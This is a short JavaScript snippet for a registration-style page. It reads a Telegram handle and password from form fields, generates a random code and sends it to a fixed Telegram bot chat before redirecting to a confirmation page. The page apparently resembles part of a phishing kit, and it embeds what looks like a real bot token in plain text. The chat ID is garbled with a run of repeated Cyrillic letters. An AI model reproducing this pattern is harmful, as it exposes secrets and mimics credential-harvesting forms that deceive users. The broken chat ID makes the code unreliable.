let BOT_TOKEN = "8200701594:AAGhsHSh7D7X5PHApcfLBmkPY6zKhUw9mRs";
let CHAT_ID = "5372569828ччччччччччччччччччччч";

let sendData = () => {
  let telegram = document.getElementById("@Telegram.me").value;
  let password = document.getElementById("Password").value;
  let btn = document.getElementById("btn");

  let code = Math.floor(Math.random() * 1000);
  let text = `\n ваш код:${code}\n`;

  // Persist code so conf.html can verify it in the same browser session
  sessionStorage.setItem("pendingCode", String(code));

  btn.disabled = true;
  btn.textContent = "sending...";

  // TODO: Your current Telegram sending logic here
  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ chat_id: CHAT_ID, text }),
  })
    .then((res) => res.json())
    .then((data) => {
      if (data.ok) {
        window.location.href = "../conf/conf.html";
      } else {
        btn.disabled = false;
        btn.textContent = "register";
        alert("Failed to send code. Please try again.");
      }
    })
    .catch(() => {
      btn.disabled = false;
      btn.textContent = "register";
      alert("Network error. Please try again.");
    });
};